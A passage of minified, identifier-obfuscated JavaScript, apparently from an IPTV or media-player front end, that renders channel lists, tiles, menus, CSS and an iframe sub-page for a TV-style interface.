if(index>0)var lastP=c.getTypePos(c.channels[index-1],(index-1));else lastP="";var l10IIOl1BtkvIII1Ypr=c.getTypePos(Ch,index),addbr=0,bef="",html="";if(index>0||gV(Ch,"nowrap")){if(gV(Ch,"br"))addbr=1;else if(typeof Ch.br!="undefined")addbr=0;else if(typeof(Ch.coordination)=="object"){if(Ch.coordination[0]<1)addbr=1}else if(l10IIOl1BtkvIII1Ypr.match(/^(label|list|fulleditline)/)||lastP!=l10IIOl1BtkvIII1Ypr)addbr=1;else if(!c.hscroll&&c.sPosX>=(perPage-1)){addbr=1;c.chfullpage=1}
if(addbr){if(!gV(Ch,"noaddbr")&&index>0){if(Ch.before)Ch.before=Ch.before.replace(/<br.*?>/,"");bef="<br clear=left>"}
if(c.hscroll){bef+="</div>";c.hscroll=0}
if(gV(Ch,"nowrap")){if(c.haswrap)Ch.before=gV(Ch,"before")+"</div>";c.haswrap=1;Ch.before=gV(Ch,"before")+"<div class='hscroll'>";c.hscroll=1}
c.sPosX=0;if(index>0)c.sPosY++}else c.sPosX++}else{c.sPosX=0;c.sPosY=0}
c.sPos[index]=[c.sPosX,c.sPosY];c.ChStyle=gV(Ch,"style");c.ChClass=gV(Ch,"class");if(l10IIOl1BtkvIII1Ypr!="list"){title=title.replace(/<img.*?>/g,"");if(l10IIOl1BtkvIII1Ypr=="bigtile"){st_w=10;st_h=194}else{st_w=10;st_h=80}
el_mini=!1;el_margin=1;if(l10IIOl1BtkvIII1Ypr=="label"||l10IIOl1BtkvIII1Ypr=="hlink"){return bef+gV(Ch,"before")+c.lO11II1atQ111llYpr(index,l10IIOl1BtkvIII1Ypr)+'<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">'+'<div id="titleid'+index+'" class="title">'+title+'</div>'+'</div></div>'+gV(Ch,"after")}
if(l10IIOl1BtkvIII1Ypr=="fulleditline"){return bef+gV(Ch,"before")+c.lO11II1atQ111llYpr(index,l10IIOl1BtkvIII1Ypr)+'<div id="titleid'+index+'" class="title">'+(Ch.imgsrc.indexOf("http")==0?'<img id="img'+index+'" src="'+_img(Ch.imgsrc)+'" class="icon">':"")+title+'</div></div>'+gV(Ch,"after")}
if(l10IIOl1BtkvIII1Ypr=="tile"||l10IIOl1BtkvIII1Ypr=="tile2"){html+=c.lO11II1atQ111llYpr(index,l10IIOl1BtkvIII1Ypr,dop);var template='<div class="item'+l10IIOl1BtkvIII1Ypr+'"><div class="logo">$logo</div><div class="'+l10IIOl1BtkvIII1Ypr+'title">$title</div><div class="'+l10IIOl1BtkvIII1Ypr+'desc">$description</div></div>';if(Ch.imgsrc&&!Ch.logo)template=template.replace('$logo','<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">');html+=template.replace("$title","<span class='title' id='titleid"+index+"'>"+title+"</span>").replace(/\$logo_30x30(.*?["'])/,_img("_ST_1px.png")+"$1 onerror='parent.onImgError(this);' data-src='"+Ch.imgsrc+"' class='icon' id='img"+index+"'").replace("$description",gV(Ch,"description")).replace("$logo",gV(Ch,"logo"))}else if(l10IIOl1BtkvIII1Ypr=="html"){html+=c.lO11II1atQ111llYpr(index,l10IIOl1BtkvIII1Ypr,dop);html+=gV(Ch,"template").replace("$title","<span class='title' id='titleid"+index+"'>"+title+"</span>").replace(/\$logo_30x30(.*?["'])/,_img("_ST_1px.png")+"$1 onerror='parent.onImgError(this);' data-src='"+Ch.imgsrc+"' class='icon' id='img"+index+"'").replace("$description",gV(Ch,"description")).replace("$logo",gV(Ch,"logo"))}else{html+=c.lO11II1atQ111llYpr(index,"start",dop);html+="<div id='rat"+index+"' class='rating'></div>";if(Ch.imgsrc)html+='<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">';html+='<div class="name" id="titleid'+index+'"><div class="title">'+title+'</div> </div>';if(Ch.side_icon)if(Ch.side_icon!="")html+='<img class="side_icon" align="left" src="'+_img(Ch.side_icon)+'" style="top:-'+st_h+'px;height:'+(st_h-4)+'px;width:'+st_w+'%;">'}
html+='</div>';return bef+gV(Ch,"before")+html+gV(Ch,"after")}
if(gV(Ch,"number")!=="")var num=Ch.number;else{var num=(index+1);if(gV(c.global,"startcontent")>0&&c.lO10111O0001lOl00Ypr.indexOf("#submenu")==-1)num-=gV(c.global,"startcontent")}
var img='';if(typeof Ch.logo_search!="undefined")Ch.imgsrc=Ch.logo_search;if(gV(Ch,"imgsrc")=="none")img='<div style="float:left;width:0px;margin: 0px 2px;padding-right: 2px;">&nbsp;</div>';else if(gV(Ch,"imgsrc")==""){img='<div style="float:left;width:'+Math.round(ll0IO0OIxzk1llIIOYpr*1.2*(css_w(100)/css_wh(100)))+'px;margin: 0px 2px;padding-right: 2px;">&nbsp;</div>'}else img='<div class="icon" style="width:'+Math.round(ll0IO0OIxzk1llIIOYpr*1.2*(css_w(100)/css_wh(100)))+'px; height:'+(ll0IO0OIxzk1llIIOYpr-css_wh(4))+'px;">'+'<img id="img'+index+'" class="imgicon"  src="'+_img("_ST_1px.png")+'" data-src="'+_img(Ch.imgsrc)+'" onerror="parent.onImgError(this);">'+'</div>';html=c.lO11II1atQ111llYpr(index,"list",dop);html+="<div class='contmenu' id='contmenu"+index+"' style='height:"+ll0IO0OIxzk1llIIOYpr+"px;'>"+"<img"+lIlI11I1I_q0000I1Ypr(1,[" onclick=\"parent.ContextMenu.show();\"",""])+" src='"+_img("_ST_menu_qb.png")+"' style='background: inherit;border-radius:0px 4px 4px 0px;position: absolute;height:"+ll0IO0OIxzk1llIIOYpr+"px;width:"+(ll0IO0OIxzk1llIIOYpr)+"px;' /></div>";if(Ch.imgsrc!="hidden")html+='<div id="numch'+index+'" class="numb">'+num+'</div>';html+=img;if(gP("lO10111O0001lOl00Ypr").indexOf("searchEngines|")==0)Ch.infolink=Ch.infolink||Ch.playlist_url||Ch.stream_url||"";if(Ch.infolink&&Ch.infolink!=" "&&gV(Ch,"search_on")==""){if(Ch.infolink=="submenu"&&Ch.submenu)Ch.infolink="["+(gV(Ch.submenu[0],"infolink")||(gV(Ch.submenu[0],"playlist_url")+gV(Ch.submenu[0],"stream_url")))+",...]";var ttl='<div class="infolinktitle">'+title+'</div>'+'<div class="infolink">'+Ch.infolink+'</div>'}else ttl=title;if(Ch.stream_url=="")html+="<div id='rat"+index+"' style='float:right;display:none;padding-top:1px;font-size:"+(ch_size*(css_wh(100)/css_w(100))-css_wh(13))+"px;width:"+css_w(31)+"px;'></div>";if(gV(Ch,"search_on")!="")var titlSt=" listsearch";else titlSt="";html+='<div style="overflow:hidden;height: 100%;padding:0px 2px 0px 0px;" id="title'+index+'"><div id="titleid'+index+'" class="title'+titlSt+'">'+ttl+'</div></div>';html+="</div>";return gV(Ch,"before")+html+gV(Ch,"after")},l1I1IQlO1ZkV1IOOOllYpr:function(){var c=this;var u=getFon(maJor.params.get("fon"));ll0IO0OIxzk1llIIOYpr=35;ch_size=27;$_("main").style.fontSize="25px";lI1I0gPIGOI10IYpr=510;title_pad=2;if(c.IS_SUBMENUURL){if(maJor.fonEnabled()){if(gV(c.global,"background")){$_(c.siteid).style.background=c.global.background;$_(c.siteid).style.backgroundSize="cover"}else if(gV(c.global,"background-image")){$_(c.siteid).style.background="url("+c.global["background-image"]+")"}else{$_(c.siteid).style.backgroundImage="url("+_img(u)+")";$_(c.siteid).style.backgroundSize="cover"}}else{$_(c.siteid).style.background="black"}
return}
$_("ftop2").style.zIndex="3";$_("ftop").style.backgroundColor=maJor.rgba("rgba(67, 67, 67, 0.5)");if(maJor.params.get("pr")>0){$_("sidebar").style.whiteSpace="nowrap";$_("top2text").style.wordBreak="unset"}else{$_("sidebar").style.whiteSpace="normal";$_("top2text").style.wordBreak="normal"}
if(maJor.fonEnabled()){if(maJor.series!="D"&&maJor.series!="C"&&maJor.series!="LW"&&maJor.platform()!="dune"&&maJor.params.get("pr")<100)
var bim="rgba(0,0,0,0."+(100-maJor.params.get("pr"))+")";else bim="";$_("pr").style.background=bim;if(!maJor.box_low){if(vPlayer.is_mini()&&!vPlayer.stopped){$_("main").style.background="none";$_("site").style.background="none";if(gV(c.global,"background")){$_("bcg1").style.display="block";$_("bcg1").style.background=c.global.background;$_("bcg2").style.display="block";$_("bcg2").style.background=c.global.background}else if(!gV(c.global,"background-image")){$_("bcg1").style.display="block";$_("bcg1").style.background="url("+_img(u)+")";$_("bcg2").style.display="block";$_("bcg2").style.background="url("+_img(u)+")"}}else{$_("main").style.backgroundImage="url("+_img(u)+")";$_("main").style.backgroundSize="cover";if(gV(c.global,"background")){$_("site").style.background=c.global.background;$_("site").style.backgroundSize="cover"}else if(gV(c.global,"background-image")){if(vPlayer.is_mini()){$_("bcg1").style.display="block";$_("bcg1").style.backgroundImage="url("+c.global["background-image"]+")";$_("bcg2").style.display="block";$_("bcg2").style.backgroundImage="url("+c.global["background-image"]+")"}else $_("site").style.background="url("+c.global["background-image"]+")"}else{$_("site").style.background="none"}}}}else{if(vPlayer.is_mini()&&!vPlayer.stopped){$_("main").style.background="none";$_("site").style.background="none";$_("bcg1").style.display="block";$_("bcg1").style.background="none black";$_("bcg2").style.display="block";$_("bcg2").style.background="none black"}else{$_("main").style.background="none black"}
$_("pr").style.background="none"}
$_("upbar").style.color=gV(c.global,"color");$_("main").style.color=maJor.params.get("color");$_("main").style.font=maJor.params.get("font");document.getElementsByTagName('body')[0].style.fontFamily=maJor.params.get("font")+", sans-serif";if($_("sitebody"))$_("sitebody").style.color=maJor.params.get("color");c.setZoom();c.l1l1IOI0Cg_0KIIlll0Ypr()},lOIQIlu0lCO0l0lYpr:function(){var c=this;var default_css=[];if(maJor.box_low)var disp="float:left;";else disp="display:inline-block;";if(!maJor.box_low)default_css.push("::-webkit-scrollbar-button:single-button {background-color: #bbbbbb;display: block;border-style: solid;height: 0px;width: 0px;}	::-webkit-scrollbar-button:single-button:vertical:decrement {	  border-width: 5px;	  border-color: transparent transparent #555555;	}	::-webkit-scrollbar-button:single-button:vertical:increment {	  border-width: 5px;	  border-color: #555555 transparent transparent transparent;	} ::-webkit-scrollbar {  width: 10px;height:3px;} ::-webkit-scrollbar-track {  background: #ddd; } ::-webkit-scrollbar-thumb {  background: #888; }::-webkit-scrollbar-thumb:hover {  background: #777; } ");default_css.push(".start{position: relative;border:0px;text-align:center;"+disp+"overflow:hidden;text-align:center; margin-left:4px;margin-top:1px;height:101px;width:10%;}");default_css.push(".start .rating{position:absolute;display:none;text-align:left;height:23px;width:28px;padding-top: 5px;padding-left: 5px;font-size:11px;}");default_css.push(".start .icon{padding:2px 2px 0px 2px;height:76%;}");default_css.push(".start .name{font-size:17px;line-height:0.9;position: absolute;bottom: 0px;width:100%;    max-height: 50%;}");default_css.push(".start .title{background: "+maJor.rgba("rgba(0,0,0,0.65)")+";border-radius:3px;width: auto;"+disp+"margin: 2px;padding: 1px 4px 4px 4px;}");default_css.push(".start .side_icon{position:relative;padding:2px;}");default_css.push("*:focus{outline: none;}");default_css.push(".hscroll{white-space: nowrap;display: inline-block;width:100%;overflow-x:auto;}");if(c.hideRight)var widthCh=99;else if(c.is_iptv>2)widthCh=63;else widthCh=50.7;widthCh-=(3500/maJor.screen().w);default_css.push("#menu{margin: 3px 0px 4px -2px;width:100%;overflow-x:hidden;overflow-y:visible;}");default_css.push(".menuitem{border:2px solid transparent;margin:0px 5px;float:right;font-size:85%;background: inherit;}");default_css.push(".itemmenu{border:2px solid transparent;margin:0px 5px;float:left;font-size:85%;background: inherit;}");default_css.push(".epgtitle{float:left;width:86%;height:23px; overflow: hidden;color:#ffd600;line-height: 23px;}");default_css.push(".epgcur{height:4px;background-color:#cccccc;}");default_css.push(".epgname{width: 40%;float: left;text-align: left;height: 35px;overflow: hidden;line-height:"+ll0IO0OIxzk1llIIOYpr+"px;}");default_css.push("#menu ul{padding:5px;margin:2px 0px;background-color: #323c42;border: 1px solid;border-top: none;border-radius: 4px;}");default_css.push(".list{text-align:left;border-radius:4px 0px 0px 4px;cursor: default;margin: 2px 0px;width: "+widthCh+"%;height:"+ll0IO0OIxzk1llIIOYpr+"px;}");default_css.push(".list .contmenu{position: relative;  float: right;display:none;}");default_css.push(".list .numb{float:left;padding-top:2px;font-size: 60%;min-width:38px;text-align:center;}");default_css.push(".list .icon{margin: 0px 2px;padding-right: 2px;float:left;text-align: center;}");default_css.push(".list .imgicon{max-width: 100%; max-height: 100%; width: auto; height: auto; vertical-align: middle;}");default_css.push(".list .title{"+((c.is_iptv>2)?"width:100%;":"line-height:"+ll0IO0OIxzk1llIIOYpr+"px;")+""+disp+"float:left;position:relative;"+(maJor.box_low?"":"white-space:nowrap;")+"}");default_css.push(".listsearch{line-height:"+(0.68*ll0IO0OIxzk1llIIOYpr)+"px !important;background-color:#ddd;color:#333;overflow: hidden;border-radius:4px;padding:3px;margin-top:2px;font-size:85%;width: 90%;height: 68%;}");default_css.push(".infolinktitle{height:63%;font-size:80%;overflow: hidden;}");default_css.push(".infolink{padding-left:3px;font-size:11px;margin-top: -4px;}");default_css.push(".default .contmenu{display:none;}");default_css.push(".selected .contmenu{display:block;}");var tilefon=maJor.params.get("tile")||"#1f2a44";default_css.push(".tile{position: relative;"+disp+"vertical-align: top;white-space: normal;}");default_css.push(".itemtile{width: 133px; height: 100px; margin: 3px; padding: 10px; background-color: "+tilefon+"; border: 1px solid "+movecolor(tilefon,2)+"; border-radius: 8px; text-align: center; font-size: 14px; overflow: hidden; word-break: break-all; }");default_css.push(".itemtile .logo{width: 55px; height: 56px; background-color: #3d4a5a; border-radius: 6px; margin: 0 auto 7px auto; text-align: center; line-height: 55px;overflow:hidden;text-align: center;}");default_css.push(".itemtile .logo img, .itemtile .logo svg{vertical-align: middle;max-width:55px;max-height:55px;}");default_css.push(".tiletitle{font-weight: bold; font-size: 17px; line-height: 1;  margin-bottom: 2px;}");default_css.push(".tiledesc{font-weight: normal; font-size: 13px; line-height: 1; color: #b0c4de;}");default_css.push(".tileselected{border-radius:8px;}");default_css.push(".tileselected .logo{background-color: #596777;}");default_css.push(".tile2{position: relative;"+disp+"vertical-align: top;white-space: normal;}");var showurl=maJor.params.get('tileurl');var titlelines=maJor.params.get('tiletitleheight');var iconheight=parseInt(maJor.params.get("tileiconheight"))||76;var tile2h=iconheight+45;if(titlelines==1&&!showurl){tile2h-=13}
default_css.push(".itemtile2{width: 151px; height: "+tile2h+"px; margin: 3px; padding: 2px; text-align: center;  font-size: 16px; overflow: hidden;word-break: break-all;}");default_css.push(".itemtile2 .logo{width: 100%; height: "+iconheight+"px; background-color: "+tilefon+"; border-radius: 10px; margin: 0 auto 5px auto; text-align: center; line-height: "+iconheight+"px; overflow: hidden;}");default_css.push(".itemtile2 .logo img, .itemtile2 .logo svg{vertical-align: middle; max-width: 100%; max-height: "+iconheight+"px; }");if(titlelines==2&&!showurl){default_css.push(".tile2title{font-weight: 700; font-size: 18px; line-height: 1.1;  margin-bottom: 3px;  overflow: hidden; text-overflow: ellipsis; background: none; border: none;-webkit-line-clamp: 2;}")}else default_css.push(".tile2title{font-weight: 700; font-size: 18px; line-height: 1.1;  margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; background: none; border: none;}");if(titlelines==1){}else default_css.push(".tile2selected .tile2title{white-space: normal; overflow: visible; text-overflow: clip; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical;}");default_css.push(".tile2desc{font-weight: 400; font-size: 13px; line-height: 1.1; white-space: nowrap;color: #a0b4ce;overflow: hidden;text-overflow: ellipsis;direction: rtl;}");default_css.push(".tile2selected{border-radius: 10px;}");default_css.push(".tile2selected .logo{background-color: "+movecolor(tilefon,2)+"}");default_css.push(".html{position: relative;"+disp+"vertical-align: top;white-space: normal;}");default_css.push(".hlink{position:relative;border:0px solid transparent;margin:0px 4px;border-radius: 4px;"+disp+"overflow:hidden;}");default_css.push(".hlink .title{overflow: hidden;max-width: 310px;font-size:90%;padding:0px 4px;float:left;height:28px; text-decoration: underline;}");default_css.push(".hlink .icon{float:left;height:22px;padding-top:5px;}");default_css.push(".fulleditline{border:1px solid transparent;width:80%;margin:1px 9%;border-radius: 20px;"+disp+"overflow:hidden;}");default_css.push(".fulleditline .title{border-radius: 20px;overflow: hidden;font-size:24px;height:24px;margin:3px;color:#2b2525; background-color: #eee;padding:7px 15px;line-height: 24px;white-space: nowrap;text-overflow: ellipsis;}");default_css.push(".fulleditline .icon{float:right;height:22px;padding-top:2px;}");default_css.push(".label{position:relative;text-align: left;border-radius: 4px;margin:-2px 4%;font-size:80%;width:92%;"+disp+"overflow:hidden;height:26px;}");default_css.push(".label .icon{float:left;height:20px;}");default_css.push(".default{background:none;}");default_css.push(".selected{background:"+maJor.rgba(maJor.params.get('focus'))+";}");default_css.push(".listselected{color:black;}");default_css.push(".site{height: 100%;width: auto;overflow-y: auto;overflow-x: hidden;font-size:"+ch_size+"px;}");default_css.push("body{color: "+$_("main").style.color+";margin:0px;padding:0px;height: 100%;width: 100%;overflow: hidden;background-color: transparent;font-family:"+maJor.params.get("font")+", sans-serif;}");default_css.push("small{font-size:70%;color:gray;}");default_css.push(".buttons{position:fixed;top:80%;left:50%;width:47%;margin:2px;display:none;padding:0px 3px 0px 3px;color:#cccccc;font-size:80%;}");default_css.push("#aside{position:absolute;z-index:1;top:0px;left:0px;height:inherit;border-radius: 0px 10px 10px 0px;padding:0px 10px 0px 2px;font-size: 27px;line-height: 1;white-space: nowrap;overflow-x: hidden;}");default_css.push("#aside img{width:27px;height:27px;margin-right:8px;}");default_css.push(".aside_default{margin:5px 0px;padding: 4px;border-radius: 8px;border: 2px solid transparent;}");default_css.push(".aside_selected{margin:5px 0px;padding: 4px;border-radius: 8px;border: 2px solid #5590e7;}");default_css.push(".aside_hide{width:30px;background:none;overflow-y: hidden;}");default_css.push(".aside_show{width:auto;overflow-y: auto;background-color:"+maJor.rgba("rgba(0, 0, 0, 0.8)")+";}");if(c.is_iptv>2){var rStyle="left:63%;width:35%;"}else if(c.global&&c.global.aside&&c.global.aside.channels){rStyle="left:53%;width:45.2%;"}else{rStyle="left:51%;width:47.2%;"}
rStyle+="top:0px;";if(!maJor.box_low)rStyle+="word-break:break-word;";if(c.typeList=="start"&&(!c.is_html||(!c.hascoords&&!c.br)))rStyle="bottom:75px;right:0px;width:50%;height:30px;overflow:hidden;position:absolute;text-align:right;";default_css.push(".description{position:fixed;margin:2px;overflow-x:hidden; overflow-y:auto;display:none;padding:0px 3px 0px 3px;font-size:"+(1+ch_size)+"px;"+(rStyle)+"}");return default_css.join(' ')},setZoom:function(m){$_("main").style.zoom=maJor.params.get("zoom")+"%";$_("popUp").style.zoom=maJor.params.get("zoom")+"%";$_("statbar2").style.zoom=maJor.params.get("zoom")+"%";if(m&&$_("sitebody")){kjtYpr.popUp("Reload page for changes zoom page",1500)}},addLinks:function(){var c=this,res="";if(c.global.link){maJor.each(c.global.link,function(v){if(v.type=="text/css")res+="<link rel='stylesheet' href='"+v.href+"' type='"+v.type+"'/>"})}
res+="<script>clearInterval(window.qrsi);</script>";if(c.global.ping&&c.global.ping.link){var tm=c.global.ping.interval||6000;if(tm<2000)tm=2000;res+="<script>var tmn=3600000/"+tm+"; var qrsi=setInterval(function(){"+"parent.uHelper.create('directnoheader').hid().getI('"+c.global.ping.link+"').parse=function(s){"+"	if(s){"+"		var x=JSON.parse(s);"+"		if(x&&x.channels){"+"			clearInterval(window.qrsi);parent.Il01QllQll().navigate('"+c.global.ping.link+"');"+"}"+"	}"+"	if(--tmn<0) clearInterval(window.qrsi);"+"}"+"},"+tm+");"+"</script>"}
return res},renderSubPage:function(pq){var c=this;c.siteid="subsite";try{if(insetActive==pq.l10I0O1I1lRl0QlI1OYpr.id){if(c.IS_SUBMENUURL){$_("subsite").style.display="block";pq.l10I0O1I1lRl0QlI1OYpr.put("is",1)}else{if($_("subsite").style.display=="block"){var ifr=$_("subsite").contentWindow||($_("subsite").contentDocument.document||$_("subsite").contentDocument);ifr.document.open();ifr.document.close();$_("subsite").style.display="none"}}
c.l1I1IQlO1ZkV1IOOOllYpr();if(c.channels.length<1&&!c.global.before){c.global.before=gV(c.global,"before")+"<div style='position:absolute;left:15px; top:48px;overflow:hidden;font-size:100%;'><small>_FPZdesPusto_</small></div>"}
if(gV(c.global,"options").indexOf("hidedescription")>=0){c.hideRight=1}else c.hideRight=0;var hmenu="";c.menu=[{"title":"&#10006;","playlist_url":"cmd:historyback(1);"}];if(c.menu.length){hmenu+="<div id='menu' style='height:31px;margin:0px;background: #222222;'>";hmenu+="<div id='subTitle' style='max-width: 80%;float: left;font-size: 24px;margin-left: 5px;max-height: 500px;overflow: hidden;'>"+c.title+"</div>";for(var i=0;i<c.menu.length;i++){var li="";var ci=gV(c.menu[i],"logo_30x30");if(ci=="hidden"||ci=="none"||ci==""||maJor.box_low||lIlI11I1I_q0000I1Ypr(12))var logo="";else logo="<img onerror=\"this.onerror=null;this.style.display='none';\" width='"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.85)+"' height='"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.7)+"' style='float: left; padding: 2px 4px 0px 0px;' src='"+_img(c.menu[i].logo_30x30)+"' /> ";hmenu+=gV(c.menu[i],"before")+"<div id='menu"+i+"' class='menuitem default' "+lIlI11I1I_q0000I1Ypr(1,[" onmousemove=\"if(parent.handler=='menu'&&(parent.getSelect()!=-3||parent.menuSel!="+i+")) {parent.menuSubSel=-2;parent.setSelect(-3);parent.menuSel="+i+";parent.linkOver();}\" onclick=\"if(parent.menuSubSel!=-2) parent.menu_hideSub();else{parent.menuSel="+i+";parent.menu_play();}\"",""])+">"+"<div style='line-height: 25px;font-size: 25px;'>"+logo+c.menu[i].title+"</div>"+li+"</div>";hmenu+=gV(c.menu[i],"after")}
hmenu+="</div>"}
var siteHeight=$_(c.siteid).offsetHeight-10;if(maJor.box_low||maJor.params.get("pr")==0)wordBreak="";else wordBreak="word-break:break-all;";maJor.statusbar("Load elements: "+c.channels.length);var iframe=$_(c.siteid);iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);if(!iframe.document)return maJor.inf("Error create document","red",2);iframe.document.open();iframe.document.write("<!DOCTYPE html><html><head>"+"<style>"+c.lOIQIlu0lCO0l0lYpr()+' '+gV(c.global,"css").replace(/(\\|')/g,"").replace(/"/g,'\"')+"</style>"+c.addLinks()+"</head><body onmousemove=\"parent.screensavertimer=-1;\" id=\"sitebody\" style=\"border:none;margin:0px; padding:0px;zoom:"+maJor.params.get("zoom")+"%;\" ontouchmove=\"parent.t_e();\" ontouchend=\"parent.t_e();\">"+hmenu+"<div id=\"scrollsite\" class=\"site\" style=\"width:100%;height:"+siteHeight+"px;\" onscroll=\"if(parent.handler!='menu') event.preventDefault();else parent.scrollSite();\"></div>"+"<div id=\"bbot\" class=\"buttons\"></div>"+"</body>"+"<script>"+"document.addEventListener(\"keydown\",parent.keyHandler,false);"+"var $=parent.$;"+"</script>"+"</html>");iframe.document.close();c.setload=1;onloadtimer=setInterval(function(){if($_("scrollsite")&&c.setload&&insetActive==pq.l10I0O1I1lRl0QlI1OYpr.id){c.setload=0;buff.cleartop();clearInterval(onloadtimer);$_("scrollsite",'<div id="zpanel" style="display:none;width:100%;height:100%;overflow-y:scroll;z-index:2; padding: 10px;"></div><div id="description" class="description"></div> <div id="controlcontent" style="padding-bottom: 43px;float: left;width:100%;margin:0px;text-align:'+((gV(c.global,"align")=="")?"center":gV(c.global,"align"))+';"><div id="content"></div></div>');if(c.l10I0O1I1lRl0QlI1OYpr.loadPage!=null){c.l10I0O1I1lRl0QlI1OYpr.INC=c.l10I0O1I1lRl0QlI1OYpr.loadPage.inc;c.l10I0O1I1lRl0QlI1OYpr.page=c.l10I0O1I1lRl0QlI1OYpr.loadPage;c.l10I0O1I1lRl0QlI1OYpr.isLoading=0;delete c.l10I0O1I1lRl0QlI1OYpr.loadPage}else c.l10I0O1I1lRl0QlI1OYpr.INC=c.inc;c.l10I0O1I1lRl0QlI1OYpr.lastResel="";c.renderChannels(getSelect());if(!pq.goBack)lll1IlIlOBP_II1lYpr(c);var def=gVs(pq.elCh,"defaultSelect")||gVs(c.global,"returnSelect")||gVs(c.global,"defaultSelect")||0;c.global.returnSelect="";c.l10I0O1I1lRl0QlI1OYpr.focused(def);if(gV(c.global,"returnTop")>0){buff.scrollsitetop(c.global.returnTop);c.global.returnTop=""}
set_times();if(maJor.params.get("rate")>0)c.get_rates();if(c.IFRAMES.length==0)c.cancel()}},80)}}catch(e){jsshowErr(" Render SubPage "+e.message)}},aside_select:0,aside_exist:function(c){return!!$_("aside")&&this.aside_items(c).length},aside_items:function(c){var c=this;return c.global&&c.global.aside&&c.global.aside.channels||[]},aside_open:function(){if(!this.aside_exist()||$_("aside").className=="aside_show")return;$_("aside").className="aside_show";maJor.setHandler("aside");this.aside_sel()},aside_lastsel:0,aside_sel:function(n){this.aside_open();var c=this,aside=c.aside_items();if(n!=null&&n!=-2){if(n=="+")c.aside_select++;else if(n=="-")c.aside_select--;else c.aside_select=n}
if(n==null){c.aside_select=c.aside_lastsel}
if(c.aside_select>=aside.length)c.aside_select=0;else if(c.aside_select<0)c.aside_select=aside.length-1;for(var i=0;i<aside.length;i++){if(c.aside_select==i&&n!=-2)$_("aside"+i).className="aside_selected";else $_("aside"+i).className="aside_default"}
var link=aside[c.aside_select];if(link){link=link.playlist_url||link.stream_url;tocroll($_("aside"),$_("aside"+c.aside_select));maJor.statusbar(link,"hint")}else c.aside_close();if(c.aside_select!=-2)c.aside_lastsel=c.aside_select},aside_close:function(){var c=this;if(!c.aside_is_open())return;if(handler=="aside")maJor.setHandler("menu");this.aside_select=-2;$_("aside").className="aside_hide";maJor.each(this.aside_items(),function(v,i){$_("aside"+i).className="aside_default"})},aside_click:function(n){if(n!=null)this.aside_sel(n);var ch=this.aside_items()[this.aside_select];ch.from_aside=1;Il01QllQll().navigate(ch)},toggle_aside:function(){var c=this;if(!c.aside_is_open())c.aside_open();else c.aside_close()},aside_is_open:function(){if(!$_("aside")||$_("aside").className=="aside_hide")return 0;return 1},aside_el_over:function(n){var c=this;if(!c.aside_is_open())c.aside_event_over(n);else c.aside_sel(n)},aside_el_click:function(n,e){if(!e)e=window.event;if(e.stopPropagation)e.stopPropagation();else e.cancelBubble=!0;var c=this;if(!c.aside_is_open()){if(n){c.aside_sel(n);c.aside_lastsel=n}else c.aside_open()}else{if(c.aside_lastsel!==n)c.aside_sel(n);else c.aside_click(n)}},aside_event_click:function(e){if(!e)e=window.event;var target=e.target||e.srcElement;if(target&&target.id!='aside'){if(e.stopPropagation)e.stopPropagation();else e.cancelBubble=!0;return}
this.toggle_aside()},aside_hover_timer:null,aside_event_over:function(n){if(typeof window.ontouchstart!="undefined")return;var c=this;if(c.aside_hover_timer)clearTimeout(c.aside_hover_timer);c.aside_hover_timer=setTimeout(function(){if(n)c.aside_sel(n);else c.aside_open()},50)},aside_event_out:function(){if(typeof window.ontouchstart!="undefined")return;var self=this;if(self.aside_hover_timer)clearTimeout(self.aside_hover_timer);self.aside_hover_timer=setTimeout(function(){self.aside_close()},100)},renderPage:function(pq){var c=this;try{if(gV(c.global,"title")!="")c.title=c.global.title;else if(pq.elCh.title!="")c.title=pq.elCh.title;else c.title=c.lO10111O0001lOl00Ypr;if(gV(c.global,"icon")!="")c.icon=c.global.icon;else c.icon=pq.elCh.logo_30x30;if(c.IS_SUBMENUURL)return c.renderSubPage(pq);c.siteid="site";c.setZoom();c.start11=new Date().getTime();breakScreen(getInfoUrl(c.lO10111O0001lOl00Ypr));$_("insetttl"+pq.l10I0O1I1lRl0QlI1OYpr.id,c.title);pq.l10I0O1I1lRl0QlI1OYpr.title=c.title;menuSubSel=-2;pq.l10I0O1I1lRl0QlI1OYpr.icon=c.icon;if(insetActive==pq.l10I0O1I1lRl0QlI1OYpr.id){c.l1I1IQlO1ZkV1IOOOllYpr();if(c.channels.length<1&&!c.global.before){c.global.before=gV(c.global,"before")+"<div style='position:absolute;left:15px; top:48px;overflow:hidden;font-size:100%;'><small>_FPZdesPusto_</small></div>"}
c.hideRight=0;var siteTop=75;if(maJor.params.get("sidebar")>0)siteTop=102;if(maJor.params.get("zoom")!=100)siteTop=$_('panel').offsetHeight;siteHeight=maJor.screen().h-siteTop;if(oInset.panel.is_hide()){siteTop=0;if(gV(c.global,"padding")!==""&&!isNaN(gV(c.global,"padding")))var pPad=gV(c.global,"padding");else pPad=maJor.panelPad;$_(c.siteid).style.paddingTop=pPad+"px"}
$_(c.siteid).style.left="0px";$_(c.siteid).style.top=siteTop+"px";$_(c.siteid).style.width="100%";$_(c.siteid).style.height="100%";if(gV(c.global,"options").indexOf("hidedescription")>=0){c.hideRight=1}else c.hideRight=0;var hmenu="";if(maJor.box_low||maJor.params.get("pr")==0)wordBreak="";else wordBreak="word-break:break-all;";if(c.menu.length){try{var wi=Math.ceil((maJor.screen().w-10-c.menu.length*9)/c.menu.length);hmenu+="<div id='menu' style='"+wordBreak+"height:"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.80+3)+"px;line-height: 95%;white-space: nowrap;'>";for(var i=0;i<c.menu.length;i++){var li="";if(c.menu[i].playlist_url=="submenu"&&c.menu[i].submenu&&c.menu[i].submenu.length){if(wi*i>maJor.screen().w*0.8)var dmi="margin-left:-150px;";else dmi="";li="<ul id='menu"+i+"sub' style='"+dmi+"position:absolute;display:none;list-style:none;z-index:2;overflow-x:hidden;overflow-y:auto;max-height:80%;'>";for(var 